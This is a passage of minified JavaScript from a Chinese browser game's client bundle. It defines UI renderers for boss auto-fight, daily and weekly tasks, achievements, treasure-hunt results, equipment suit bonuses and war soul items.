d.TipsCT.ins().showTips(gettext("服务器开启{0}天后解锁高级托管，开通后可激活",r.openDay)),void(this.check.selected=!1)}if(-2!=n)return d.TipsCT.ins().showTips(gettext("开通高级托管特权可激活")),void(this.check.selected=!1)}return t[this.data.bossId].isExKo?void(this.check.selected?f.RexueDideCT.ins().changeBossArr(this.data.bossId,1):f.RexueDideCT.ins().changeBossArr(this.data.bossId,0)):(d.TipsCT.ins().showTips(gettext("首次击杀BOSS后才可进行托管")),void(this.check.selected=!1))},e}(o.BaseItemRender);e.AutoFightBossItemRender=g,window.AutoFightBossItemRender=g,__reflect(g.prototype,"AutoFightBossItemRender",[]),window.AutoFightBossItemRender=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemDayAndWeekTaskRender=void 0;var n=i(5),o=i(3),s=i(9),a=i(2),r=i(35),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnGet,this.onClick)},e.prototype.dataChanged=function(){this.taskName.textFlow=n.TextFlowMaker.generateTextFlow((0==this.data.index?gettext("【日常】"):gettext("【周常】"))+this.data.desc);var t=this.data.value>=this.data.target?4251448:15937822;switch(this.progress.textFlow=n.TextFlowMaker.generateTextFlow(gettext("进度: |C:{0}&T:{1}/{2}|",t,this.data.value,this.data.target)),this.reward.data=this.data.item,this.imgGot.visible=!1,this.btnGet.visible=!0,this.data.state){case 0:this.data.control?(this.btnGet.label=gettext("前  往"),this.btnGet.enabled=!0):(this.btnGet.label=gettext("未完成"),this.btnGet.enabled=!1),this.showRed.visible=!1;break;case 1:this.btnGet.label=gettext("领奖"),this.btnGet.enabled=!0,this.showRed.visible=!0;break;case 2:this.imgGot.visible=!0,this.btnGet.enabled=this.btnGet.visible=!1,this.showRed.visible=!1}},e.prototype.onClick=function(){return 0==this.data.state?void(this.data.control&&this.data.controlTarget?(s.Activity.ins().handleTurn(this.data.controlTarget),win.close("DayAndWeekTaskWin")):a.TipsCT.ins().showTips(gettext("任务未完成"))):void(0==this.data.index?1==this.data.state&&r.TaskCT.ins().sendGetTask(this.data.id):1==this.data.state&&r.TaskCT.ins().sendWeekGetTask(this.data.id))},e}(o.BaseItemRender);e.ItemDayAndWeekTaskRender=l,window.ItemDayAndWeekTaskRender=l,__reflect(l.prototype,"ItemDayAndWeekTaskRender",[]),window.ItemDayAndWeekTaskRender=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemExperienceRender=void 0;var n=i(3),o=i(35),s=i(515),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isHide=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstTask.itemRenderer=s.ItemExperienceTaskRender,this.look.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.scroller.addEventListener(eui.UIEvent.CHANGE_START,this.onMoveClick,this),this.scroller.addEventListener(eui.UIEvent.CHANGE_END,this.onEndClick,this)},e.prototype.dataChanged=function(){var t=this.data.type,e=this.data.open,i=this.data.show;0==e?this.currentState="lock":0==i?this.currentState="hide":this.currentState="show";var n=o.TaskCT.ins().getAchievementTaskCfgByType(t);n&&0!=n.length&&(this.lstTask.dataProvider=new eui.ArrayCollection(n)),this.showRed.visible=o.TaskCT.ins().redExperienceTask(t),this.imgBg.source="Liliantype"+t},e.prototype.onClick=function(t){void 0!=this.parent.scrollV&&(this.parent.scrollV=168*this.parent.selectedIndex),0==this.data.show?o.TaskCT.ins().viewShowChapter(this.itemIndex):o.TaskCT.ins().viewShowChapter(-1)},e.prototype.onMoveClick=function(){console.log("11move111"),this.parent.parent.scrollPolicyV!=eui.ScrollPolicy.OFF&&(this.parent.parent.scrollPolicyV=eui.ScrollPolicy.OFF)},e.prototype.onEndClick=function(){this.parent.parent.scrollPolicyV=eui.ScrollPolicy.ON},e}(n.BaseItemRender);e.ItemExperienceRender=a,window.ItemExperienceRender=a,__reflect(a.prototype,"ItemExperienceRender",[]),window.ItemExperienceRender=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemExperienceTaskRender=void 0;var n=i(24),o=i(5),s=i(3),a=i(9),r=i(2),l=i(35),h=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.task=l.TaskCT.ins().getTaskData(t.achievementId,t.taskId),this.itemIcon.data=t.awardList[0],this.desc.textFlow=o.TextFlowMaker.generateTextFlow(t.name);var e=this.task?this.task.value:0,i=e>t.target?3532333:15937822,s=gettext("进度：|C:{0}&T:{1}/{2}|",i,n.CommonUtils.overLengthChange(e),n.CommonUtils.overLengthChange(t.target));this.progress.textFlow=o.TextFlowMaker.generateTextFlow(s);var a=this.task?this.task.state:0;this.lingqu.visible=2==a,this.btnGet.visible=!this.lingqu.visible,this.showRed.visible=1==a,this.btnGet.visible&&(t.guide?(this.btnGet.label=this.showRed.visible?gettext("领奖"):gettext("前往"),this.btnGet.enabled=!0):(this.btnGet.label=this.showRed.visible?gettext("领奖"):gettext("未完成"),this.btnGet.enabled=this.showRed.visible))},e.prototype.skinComplete=function(){this.addTouchEvent(this.btnGet,this.onClick)},e.prototype.onClick=function(){var t=this.task?this.task.state:0,e=this.data;switch(t){case 0:e.guide?"number"!=typeof e.guide||isNaN(e.guide)?this.goOpenView(e.guide):a.Activity.ins().handleTurn(e.guide):r.TipsCT.ins().showTips(gettext("任务未完成"));break;case 1:l.TaskCT.ins().sendGetAchieve(e.achievementId)}},e.prototype.goOpenView=function(t){for(var e=0;e<t.length;e++)a.Activity.ins().handleTurn(t[e])},e}(s.BaseItemRender);e.ItemExperienceTaskRender=h,window.ItemExperienceTaskRender=h,__reflect(h.prototype,"ItemExperienceTaskRender",[]),window.ItemExperienceTaskRender=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TaskTipsRenderer=void 0;var n=i(3),o=i(282),s=i(283),a=i(35),r=i(0),l=i(30),h=i(18),u=i(5),p=i(64),d=i(6),c=i(2),f=i(13),g=function(t){function e(){var e=t.call(this)||this;return e._sn_="tasktipsrendererskin",e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){if(this.data instanceof o.AchievementData){var t=a.TaskCT.ins().getAchieveConfById(this.data.id);if(!t)return;this.updateView(t,this.data.value,this.data.state)}else if(this.data instanceof s.TaskData){var e=r.GlobalConfig.DailyConfig[this.data.id];if(!e)return;this.updateView(e,this.data.value,this.data.state)}else this.eIcon.source="",this.showEff(!1);var i=a.TaskCT.ins().getAchieveConfById(this.data.id);i.targetmap&&p.MainUICC.startGuide([i.targetmap])}},e.prototype.updateView=function(t,e,i){var n=t.target?"|C:"+(this.data.state?h.ColorUtil.GREEN:h.ColorUtil.RED)+"&T:("+e+"/"+t.target+")|":"";this.eTitle.textFlow=u.TextFlowMaker.generateTextFlow(t.name+" "+n),n=gettext("奖励:");for(var o in t.awardList)n+=" "+l.RewardData.getRewardStr(l.RewardData.objectToRewardData(t.awardList[o]));t.trainExp&&(n+=gettext(" 历练值*${0}",t.trainExp)),this.eTips.text=n,this.showEff(1==i)},e.prototype.showEff=function(t){t?this.eMc.data=RES_DIR_EFF+"Briefing":this.eMc&&this.eMc.removeDisplay()},e.prototype.onBtnClick=function(){if(this.data)if(this.data instanceof o.AchievementData){var t=a.TaskCT.ins().getAchieveConfById(this.data.id);if(1==this.data.state&&109!=t.type){for(var e=[],i=0;i<t.awardList.length;i++)t.awardList[i].job?f.SubRoles.ins().getSubRoleByIndex(0).job==t.awardList[i].job&&e.push(t.awardList[i]):e.push(t.awardList[i]);var n=d.BagCT.ins().rockonNeedNum(e);if(n&&d.BagCT.ins().getAllSurplusCount(n)<0)return void c.TipsCT.ins().showTips(gettext("背包已满"));a.TaskCT.ins().sendGetAchieve(this.data.achievementId)}else win.open("TasktipsTip")}else if(this.data instanceof s.TaskData){var l=r.GlobalConfig.DailyConfig[this.data.id];if(1==this.data.state){var n=d.BagCT.ins().rockonNeedNum(l.awardList);if(n&&d.BagCT.ins().getAllSurplusCount(n)<0)return void c.TipsCT.ins().showTips(gettext("背包已满"));a.TaskCT.ins().sendGetTask(this.data.id)}else win.open("TasktipsTip")}},e}(n.BaseItemRender);e.TaskTipsRenderer=g,window.TaskTipsRenderer=g,__reflect(g.prototype,"TaskTipsRenderer",[]),window.TaskTipsRenderer=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsSkillAlertPanel=void 0;var n=i(158),o=i(3),s=i(31),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="OrangeEquipNoticeSkin2",e.isUsing=!1,e.horizontalCenter=0,e}return __extends(e,t),e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this);var e=this.data,i=new n.SkillData(e);this.item.setItemImg(i.icon),this.skillName.text=i.name,this.skillName.textColor=s.QUALITY_COLOR[4]},e}(o.BaseItemRender);e.TipsSkillAlertPanel=a,window.TipsSkillAlertPanel=a,__reflect(a.prototype,"TipsSkillAlertPanel",[]),window.TipsSkillAlertPanel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HuntBoxsTips=void 0;var n=i(1),o=i(11),s=i(0),a=i(127),r=i(9),l=i(149),h=function(t){function e(){var e=t.call(this)||this;return e.type=0,e._sn_="TreasureRuneGift",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.index=t[0],t.length>=2&&(this.type=t[1],this.activityID=t[2]),this.addTouchEvent(this.bgClose,this.onTap),this.gift.itemRenderer=o.ItemBase,3==this.type?this.initActivity():2==this.type?this.initHeirloom():this.initInfo()},e.prototype.initInfo=function(){var t=s.GlobalConfig.ActivityType40_1Config[this.activityID][this.index];if(t){var e=r.Activity.ins().getActivityDataById(this.activityID);if(this.gift.dataProvider=new eui.ArrayCollection(t.rewards),this.num0.text=e.lottery+"",0==a.RuneCC.boxs.length||a.RuneCC.boxs[this.index-1]==a.RuneCC.UNGET){var i=t.lotteryCount-e.lottery;this.num1.text=i>0?i+"":"0",this.already.visible=!1}else this.num1.visible=this.num2.visible=this.num3.visible=!1,this.already.visible=!0}},e.prototype.initHeirloom=function(){var t=s.GlobalConfig.HeirloomTreasureRewardConfig[this.index];if(t)if(this.gift.dataProvider=new eui.ArrayCollection(t.reward),this.num0.text=l.Heirloom.ins().huntTimes.toString(),l.Heirloom.ins().huntBoxInfo[this.index-1]==l.Heirloom.UNGET){var e=t.needTime-l.Heirloom.ins().huntTimes;this.num1.text=e>0?e+"":"0",this.already.visible=!1}else this.num1.visible=this.num2.visible=this.num3.visible=!1,this.already.visible=!0},e.prototype.initActivity=function(){var t=s.GlobalConfig.ActivityType18Config[this.activityID][this.index];this.gift.dataProvider=new eui.ArrayCollection(t.rewards);var e=r.Activity.ins().getActivityDataById(this.activityID);this.num0.text=e.num+"";var i=t.dbCount-e.num;this.num1.text=i>0?i+"":"0",1==e.getStateByIndex(this.index)?this.already.visible=!0:this.already.visible=!1},e.prototype.onTap=function(){win.close(this)},e}(n.BaseView);e.HuntBoxsTips=h,window.HuntBoxsTips=h,__reflect(h.prototype,"HuntBoxsTips",[]),window.HuntBoxsTips=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HuntResultWin=e.waitTime=e.c_depotY=e.c_depotX=e.c_distantY=e.c_distantX=e.c_firstY=e.c_firstX=e.c_launchY=e.c_launchX=void 0;var n=i(18),o=i(16),s=i(5),a=i(1),r=i(11),l=i(0),h=i(4),u=i(9),p=i(6),d=i(2),c=i(1324),f=i(111),g=i(10);e.c_launchX=window.c_launchX=180,e.c_launchY=window.c_launchY=500,e.c_firstX=window.c_firstX=0,e.c_firstY=window.c_firstY=0,e.c_distantX=window.c_distantX=77,e.c_distantY=window.c_distantY=93,e.c_depotX=window.c_depotX=320,e.c_depotY=window.c_depotY=620,e.waitTime=window.waitTime=50;var m=function(t){function i(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="HuntResult",e.arr=[],e.items=[],e.type=0,e}return __extends(i,t),i.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.buyBtn,this.buy),observe(this,this.updateView,c.Hunt.ins().postHuntResult),observe(this,this.updateView,u.Activity.ins().postHuntResult),this.updateView([t[0],t[1],t[2],t[3]])},i.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.closeFunc&&this.closeFunc(),Timer.stop(this.buy,this),this.releaseAllItem()},i.prototype.updateView=function(t){if(this.canClicck=!0,this.huntType=t[0],this.arr=t[1],this.type=t[2],this.activityID=t[3],this.closeFunc=null,0==this.huntType){var e=0;0==this.type?e=l.GlobalConfig.TreasureHuntConfig.huntOnce:1==this.type?e=l.GlobalConfig.FuwenTreasureConfig.huntOnce:2==this.type?e=l.GlobalConfig.HeirloomTreasureConfig.huntOnce:3==this.type?e=l.GlobalConfig.ActivityType18Config[this.activityID][1].yb:4==this.type?e=l.GlobalConfig.ActivityType40Config[this.activityID][1].yb:5==this.type&&(e=l.GlobalConfig.BeastTreasureBase.costYB),this.yb=e,this.buyBtn.labelDisplay.text=gettext("购买{0}次",1)}else{var e=0;0==this.type?e=l.GlobalConfig.TreasureHuntConfig.huntTenth:1==this.type?e=l.GlobalConfig.FuwenTreasureConfig.huntTenth:2==this.type?e=l.GlobalConfig.HeirloomTreasureConfig.huntTenth:3==this.type?e=l.GlobalConfig.ActivityType18Config[this.activityID][2].yb:5==this.type&&(e=l.GlobalConfig.BeastTreasureBase.costYBten),this.yb=e,this.buyBtn.labelDisplay.text=gettext("购买{0}次",10)}this.yb>0?this.zwHunt.addChildAt(this.eYuanBaoGroup,0):o.DisplayUtils.removeFromParent(this.eYuanBaoGroup),this.zwHunt.visible=!0;var i;if(0==this.type)i=l.GlobalConfig.TreasureHuntConfig.huntItem;else if(1==this.type)i=l.GlobalConfig.FuwenTreasureConfig.huntItem;else if(2==this.type)i=l.GlobalConfig.HeirloomTreasureConfig.huntItem;else if(3==this.type){i=l.GlobalConfig.ActivityType18Config[this.activityID][1].item;var a=u.Activity.ins().getActivityDataById(this.activityID);if(a){var r=l.GlobalConfig.ActivityType18Config[this.activityID][0].relateActivityId,h=u.Activity.ins().getActivityDataById(r);h&&(this.closeFunc=function(){u.Activity.ins().postHuntResultPlayFunc()})}}else 4==this.type?i=l.GlobalConfig.ActivityType40Config[this.activityID][1].itemId:5==this.type&&(i=l.GlobalConfig.BeastTreasureBase.costItemId);this.zw.text=this.yb>0?this.yb+"":"";var d=p.BagCT.ins().getBagGoodsByTypeAndId(p.BagCT.BAG_TYPE_OTHTER,i),c=this.huntType?10:1,f=d?d.count:0;this.zwNum1.textFlow=s.TextFlowMaker.generateTextFlow("<font color="+(f>=c?n.ColorUtil.GREEN_COLOR:n.ColorUtil.RED_COLOR)+">"+f+"</font> "),this.icon.source=g.ItemUtil.getItemSource(l.GlobalConfig.ItemConfig[i]),this.zwNum2.text=0==this.huntType?"/1）":"/10）",this.playResult()},i.prototype.playResult=function(t){var i=this;this.releaseAllItem();for(var n=this.arr.length,o=0;n>o;o++){var s=this.createItem(this.arr[o]);this.items.push(s);var a=egret.Tween.get(s);s.x=o%5*e.c_distantX+e.c_firstX,s.y=Math.floor(o/5)*e.c_distantY+e.c_firstY,s.alpha=0,a.wait(o*e.waitTime).to({alpha:1},200).call(function(){n--,0==n&&(void 0!=t&&t(),i.canClicck=!0)})}},i.prototype.playGet=function(t){for(var i=this.arr.length,n=0;i>n;n++)if(this.items[n]){var o=egret.Tween.get(this.items[n]);o.to({y:e.c_depotY,x:e.c_depotX,scaleX:0,scaleY:0},300-50*Math.floor(n/5)).call(function(){i--,0==i&&void 0!=t&&t()})}},i.prototype.createItem=function(t){var i=PoolMgr.create(r.ItemBase);this.listCon.addChild(i);var n=l.GlobalConfig.ItemConfig[t[0]];return n?(i.num=t[1],i.data=t[0]):i.data={type:0,count:t[1],id:t[0]},i.x=e.c_launchX,i.y=e.c_launchY,i},i.prototype.releaseAllItem=function(){for(;this.items.length;){var t=this.items.pop();t.destruct(),t.parent.removeChild(t),PoolMgr.release(t)}},i.prototype.buy=function(){var t=this;if(this.buyBtn.touchEnabled=!1,Timer.start(1e3,1,function(){t.buyBtn.touchEnabled=!0},this),this.canClicck){var e=0;3==this.type?e=l.GlobalConfig.ActivityType18Config[this.activityID][1].item:4==this.type&&(e=l.GlobalConfig.ActivityType40Config[this.activityID][1].itemId);var i=p.BagCT.ins().getBagGoodsByTypeAndId(p.BagCT.BAG_TYPE_OTHTER,e);if(i&&i.count){if(0==this.type)c.Hunt.ins().sendHunt(this.huntType);else if(3==this.type)u.Activity.ins().sendReward(this.activityID,0==this.huntType?1:2);else if(4==this.type){if(p.BagCT.ins().getAllSurplusCount()<20)return void d.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));u.Activity.ins().sendReward(this.activityID,0,0==this.huntType?1:2)}this.canClicck=!1}else if(this.yb>0)if(p.BagCT.ins().getAllSurplusCount()<20)d.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));else{var n=this.huntType?10:1;f.HuntWarnBuyWin.showBuyWarn(this.getPanelNameByType()+"-HuntResultWin"+this.huntType,this.huntWarnFun.bind(this),gettext("是否消耗{0}元宝购买{1}*{2}",this.yb,l.GlobalConfig.ItemConfig[e].name,n))}}},i.prototype.getPanelNameByType=function(){return 4==this.type?"OSATarget40Panel_"+this.activityID:3==this.type?"OSATarget18Panel"+l.GlobalConfig.ActivityType18Config[this.activityID][0].showType:void 0},i.prototype.huntWarnFun=function(){h.ActorCC.yb>=this.yb?0==this.type?c.Hunt.ins().sendHunt(this.huntType):3==this.type?u.Activity.ins().sendReward(this.activityID,0==this.huntType?1:2):4==this.type&&u.Activity.ins().sendReward(this.activityID,0,0==this.huntType?1:2):d.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))},i}(a.BaseView);e.HuntResultWin=m,window.HuntResultWin=m,__reflect(m.prototype,"HuntResultWin",[]),window.HuntResultWin=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AttrNextVal=void 0;var n=function(t){function e(){var e=t.call(this)||this;return e._sn_="AttrNextValSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.attr&&this.data)if("string"==typeof this.data)this.attr.textFlow=tHtml(this.data),this.gicon.visible=!1,this.attrNext.visible=!1;else{var t=this.data.curTxt;this.attr.textFlow=tHtml(t),this.data.nextTxt?this.attrNext.textFlow=tHtml(this.data.nextTxt):(this.gicon.visible=!1,this.attrNext.visible=!1)}},e}(eui.ItemRenderer);e.AttrNextVal=n,window.AttrNextVal=n,__reflect(n.prototype,"AttrNextVal",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianSuitPanel=void 0;var n=i(21),o=i(18),s=i(5),a=i(1),r=i(0),l=i(4),h=i(113),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="TunTianSuitPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(t,e){e?(this.nextTitle.textFlow=s.TextFlowMaker.generateTextFlow1(e.lable),this.nextAttr.textFlow=s.TextFlowMaker.generateTextFlow1(e.dec)):(this.nextGroup.visible=!1,this.nextTitle.visible=!1),this.title.textFlow=s.TextFlowMaker.generateTextFlow1(t.lable),this.attr1.textFlow=s.TextFlowMaker.generateTextFlow1(t.dec),t.act||this.curGroup.parent.removeChild(this.curGroup),this.playEff()},e.prototype.playEff=function(){this.skillMc||(this.skillMc=new n.MovieClip,this.effGroup.addChild(this.skillMc),this.skillMc.x=-50,this.skillMc.y=-70),this.skillMc.playFile(RES_DIR_EFF+r.GlobalConfig.TunTianBaseConf.skillEff+l.ActorCC.jobId,-1)},e.prototype.play=function(){var t=this;setTimeout(function(){return t.stage?(t.eff.playFile(RES_DIR_EFF+"ts_skill",0),t.flyWords.visible=!0,t.flyWords.alpha=1,t.flyWords.y=-50,egret.Tween.get(t.flyWords).to({y:-70,alpha:.5},1e3).call(function(){t.flyWords.visible=!1},t),void t.play()):(t.eff.stop(),removeFromParent(t.eff),void(t.eff=null))},1500)},e.open2=function(t){var i=4,n=0,s={};s.act=!1,s.dec="";for(var a={},l=Object.keys(r.GlobalConfig.TunTianSuitConf).length,u=l/i,p={},d={},c=1;u>=c;c++){n=+c;for(var f=h.TunTianEquipSystem.ins().getLvCount(t,n),g=0;i>g;g++){var m=r.GlobalConfig.TunTianSuitConf[(c-1)*i+g+1],v=r.GlobalConfig.TunTianSuitConf[c*i+g+1];if(m){var y=m.count[0],C=(m.count[1],f>=y);m.desc;C?(p[g]=m,d[g]=v):!d[g]&&(d[g]=m)}}}for(var T in p){var b=p[T],w=b.desc;s.act=!0,s.dec+=gettext("·吞噬装备{2}：{0}件套{1}级激活属性：",b.count[0],b.level,b.level)+"\n"+("|C:'"+o.ColorUtil.GREEN+"'>&T:"+w+"|\n")}s.lable=gettext("当前套装效果"),a.lable=gettext("下级套装效果"),a.dec="";for(var I in d){var v=d[I];v&&(a.dec+=gettext("·吞噬装备{2}：{0}件套{1}级激活属性：",v.count[0],v.level,v.level)+"\n",a.dec+=v.desc+"\n")}0==a.dec.length&&(a=null),s.act=Object.keys(p).length>0,win.open(e,s,a)},e.open=function(t){var i=r.GlobalConfig.TunTianSuitConf,n={},s={},a=[],l=[];for(var u in i){var p=i[u],d=+u,c=h.TunTianEquipSystem.ins().getLvCount(t,d),f=0;for(var g in p){var m=p[g],v=m.count[0];c>=v?a[f]=m:!l[f]&&(l[f]=m),f++}}if(n.dec="",a.length>0){for(var y=0;y<a.length;y++){var C=a[y],T=C.desc;n.dec+=gettext("·吞噬装备{2}：{0}件套{1}级激活属性：",C.count[0],C.level,C.level)+"\n",n.dec+="|C:'"+o.ColorUtil.GREEN+"'>&T:"+T+"|\n"}s.lable=gettext("下级套装效果")}else s.lable=gettext("当前套装效果");if(l.length>0){s.dec="";for(var b in l){var w=l[b],T=w.desc;s.dec+=gettext("·吞噬装备{2}：{0}件套{1}级激活属性：",w.count[0],w.level,w.level)+"\n",s.dec+=T+"\n"}}else s=null;n.act=a.length>0,n.lable=gettext("当前套装效果"),win.open(e,n,s)},e}(a.BaseView);e.TunTianSuitPanel=u,window.TunTianSuitPanel=u,__reflect(u.prototype,"TunTianSuitPanel",[]),window.TunTianSuitPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulBookItem=void 0;var n=i(3),o=i(0),s=i(60),a=function(t){function e(){var e=t.call(this)||this;return e.proPos={x:0,y:0},e}return __extends(e,t),e.prototype.skinComplete=function(){this.proPos={x:this.imgSoul.x,y:this.imgSoul.y},this.dataChanged(),this.addTouchEvent(this.btnStudy,this.onBtnClick)},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.curWarSoulId=this.data,this.updateView())},e.prototype.updateView=function(){var t=s.WarSoulCT.ins().warSoulBookDic[this.curWarSoulId];if(t){this.curCfg=o.GlobalConfig.WarSoulTuJianConfig[t.bookId],this.imgSoul.visible=!0,this.imgNull.visible=!1;var e=o.GlobalConfig.WarSoulConfig[t.warsoulId];this.imgSoul.source=e?s.WarSoulCT.ins().getWarSoulModelImg(e.modelId):"",this.imgSoul.scaleX=this.imgSoul.scaleY=.6*s.WarSoulCT.ins().getWarSoulModelSet(e);var i=s.WarSoulCT.ins().getWarSoulModelPos(e);i&&(this.imgSoul.x=this.proPos.x+i.x,this.imgSoul.y=this.proPos.y+i.y),this.txtName.text=e?e.name:"?";var n=s.WarSoulCT.ins().getNextBookCfg(this.curCfg);this.curCfg&&null==n?this.txtLv.text=gettext("已满级"):!this.curCfg||t.num>=n.num?(this.btnStudy.visible=!0,this.txtLv.text=""):(this.btnStudy.visible=!1,this.txtLv.text=gettext("等级:{0}",this.curCfg.lv)+"\n"+gettext("需激活{0}/{1}",t.num,n.num)),this.btnStudy.eRp&&(this.btnStudy.eRp.visible=this.btnStudy.visible)}else this.txtName.text="?",this.txtLv.text="",this.imgSoul.visible=this.btnStudy.visible=!1,this.imgNull.visible=!0;this.eRp.visible=this.btnStudy.visible,this.updateSelect()},e.prototype.setSelect=function(t){this.imgSelect.visible=t},e.prototype.updateSelect=function(){var t=this.curWarSoulId==s.WarSoulCT.ins().curSelBookId;this.imgSelect.visible=t},e.prototype.onBtnClick=function(){s.WarSoulCT.ins().sendWarSoulTuJianLvUp(this.curWarSoulId)},e}(n.BaseItemRender);e.WarSoulBookItem=a,window.WarSoulBookItem=a,__reflect(a.prototype,"WarSoulBookItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulDecomItem=void 0;var n=i(3),o=i(60),s=function(t){function e(){var e=t.call(this)||this;return e.isSelect=!1,e.proPos={x:0,y:0},e}return __extends(e,t),e.prototype.skinComplete=function(){this.proPos={x:this.imgSoul.x,y:this.imgSoul.y},this.dataChanged()},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.info=this.data,this.updateView())},e.prototype.updateView=function(){if(!this.info||!this.info.cfg)return void this.setSelect(!1);this.imgSoul.source=o.WarSoulCT.ins().getWarSoulModelImg(this.info.cfg.modelId),this.imgSoul.scaleX=this.imgSoul.scaleY=.6*o.WarSoulCT.ins().getWarSoulModelSet(this.info.cfg);var t=o.WarSoulCT.ins().getWarSoulModelPos(this.info.cfg);t&&(this.imgSoul.x=this.proPos.x+t.x,this.imgSoul.y=this.proPos.y+t.y),this.txtLv.text=this.info.level.toString(),this.txtName.text=this.info.name,this.imgQua.source=this.info.getQualityImg(),this.isSelect=-1!=o.WarSoulCT.ins().curSelDecomIdLst.indexOf(this.info.id),this.setSelect(this.isSelect)},e.prototype.setSelect=function(t){this.isSelect=t,this.imgSelect.visible=this.isSelect},e}(n.BaseItemRender);e.WarSoulDecomItem=s,window.WarSoulDecomItem=s,__reflect(s.prototype,"WarSoulDecomItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulMemItem=void 0;var n=i(3),o=i(1354),s=i(60),a=function(t){function e(){var e=t.call(this)||this;return e.proPos={x:0,y:0},e}return __extends(e,t),e.prototype.skinComplete=function(){this.barExp.value=0,this.proPos={x:this.imgSoul.x,y:this.imgSoul.y},this.dataChanged(),this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){this.skin&&this.data&&(this.warSoulId=this.data,this.updateView())},e.prototype.updateView=function(){if(this.info=s.WarSoulCT.ins().warSoulDic[this.warSoulId],this.info){this.txtName.text=this.info.name,this.txtLv.text=gettext("等级:")+this.info.level,this.imgQua.source=this.info.getQualityImg(),this.updateSelectState(),this.imgSoul.source=s.WarSoulCT.ins().getWarSoulModelImg(this.info.cfg.modelId),this.imgSoul.scaleX=this.imgSoul.scaleY=.6*s.WarSoulCT.ins().getWarSoulModelSet(this.info.cfg);var t=s.WarSoulCT.ins().getWarSoulModelPos(this.info.cfg);t&&(this.imgSoul.x=this.proPos.x+t.x,this.imgSoul.y=this.proPos.y+t.y),this.btnFight.visible=s.WarSoulCT.ins().curWarSoulId!=this.info.id}},e.prototype.updateSelectState=function(){this.imgSelect.visible=s.WarSoulCT.ins().curSelWarSoulId==(this.info?this.info.id:0)},e.prototype.setSelect=function(t){this.imgSelect.visible=t},e.prototype.onClick=function(t){switch(t.target){case this.btnInfo:win.open(o.WarSoulWindow,this.info);break;case this.btnFight:s.WarSoulCT.ins().sendWarSoulFight(this.info.id,1);break;case this.btnChange:win.open("RenameWin",1,this.info.id)}},e}(n.BaseItemRender);e.WarSoulMemItem=a,window.WarSoulMemItem=a,__reflect(a.prototype,"WarSoulMemItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSwaAttrItem=void 0;var n=i(3),o=i(0),s=i(60),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){this.bar.labelDisplay.visible=!0,this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data.mainInfo,e=this.data.fuInfo;this.lbAttrName.text=s.WarSoulCT.ins().getAttrName(this.data.attrId,!0)+": ",this.lbAttrName2.text=s.WarSoulCT.ins().getAttrName(this.data.attrId,!0)+": ";var i=this.data.attrId,n=0,a=0;if(t){t.cfg;this.bar.maximum=t.cfg.qualityMax[i-1]?t.cfg.qualityMax[i-1]:100,n=t.attr[i]?t.attr[i].qlty:0}else this.bar.maximum=100,this.bar.value=0;this.bar.value=n,e&&(a=e.attr[i]?e.attr[i].qlty:0),this.lbAddAttr2.text=a.toString();var r=o.GlobalConfig.WarSoulBaseConfig.eatInterval[i-1];r=r||[0,0];var l=a-n>0?a-n:0;t&&e&&l?(this.imgArrow.visible=!0,this.lbAddAttr.text=Math.floor(l*r[0]*1e-4)+"~"+Math.floor(l*r[1]*1e-4)):(this.imgArrow.visible=!1,this.lbAddAttr.text="")}},e}(n.BaseItemRender);e.WarSoulSwaAttrItem=a,window.WarSoulSwaAttrItem=a,__reflect(a.prototype,"WarSoulSwaAttrItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSwaItem=void 0;var n=i(3),o=i(0),s=i(60),a=function(t){function e(){var e=t.call(this)||this;return e.proPos={x:0,y:0},e}return 